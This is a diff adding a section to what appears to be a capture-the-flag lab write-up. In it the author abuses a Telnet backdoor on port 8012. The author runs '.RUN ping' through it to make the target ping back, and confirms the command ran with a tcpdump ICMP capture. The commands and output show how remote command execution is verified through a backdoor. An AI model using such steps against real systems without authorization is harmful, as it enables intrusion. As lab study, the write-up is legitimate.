@@ -236,3 +236,38 @@ SKIDY'S BACKDOOR. Type .HELP to view commands
 ```
 
 The banner identified the service on port `8012` as SKIDY'S BACKDOOR, and pointed to `.HELP` for its commands. Running `.HELP` itself is not recorded here yet.
+
+## 5. Verifying Backdoor Access with tcpdump and ICMP
+
+To test whether the Telnet backdoor was actually usable, I ran a tcpdump listener and used the backdoor's `.RUN` command to make the target send ICMP traffic back to my listener. If the listener captured that traffic, it would confirm the backdoor could execute commands and reach my machine.
+
+### Backdoor Commands
+
+After reconnecting to the backdoor on port `8012`, I ran:
+
+```text
+SKIDY'S BACKDOOR. Type .HELP to view commands
+.RUN ping <IP_ADDRESS> -c 1
+.RUN ping 192.168.128.110 -c 1
+```
+
+Here, `192.168.128.110` was my listener-side address on `tun0`, while `<IP_ADDRESS>` is the lab target, shown with the unified placeholder used throughout this write-up.
+
+### tcpdump Listener
+
+On my machine, I listened for ICMP traffic on `tun0`:
+
+```bash
+sudo tcpdump ip proto icmp -i tun0
+```
+
+```text
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+20:17:03.098898 IP <IP_ADDRESS> > 192.168.128.110: ICMP echo request, id 2, seq 1, length 64
+20:17:03.098981 IP 192.168.128.110 > <IP_ADDRESS>: ICMP echo reply, id 2, seq 1, length 64
+```
+
+### Interpretation
+
+The listener captured an ICMP echo request from the target to `192.168.128.110`, followed by an ICMP echo reply back to the target. That round trip confirmed the target could hear and respond to my machine through the backdoor path: the backdoor was not just a banner, it could execute a command and produce network traffic back to the listener.
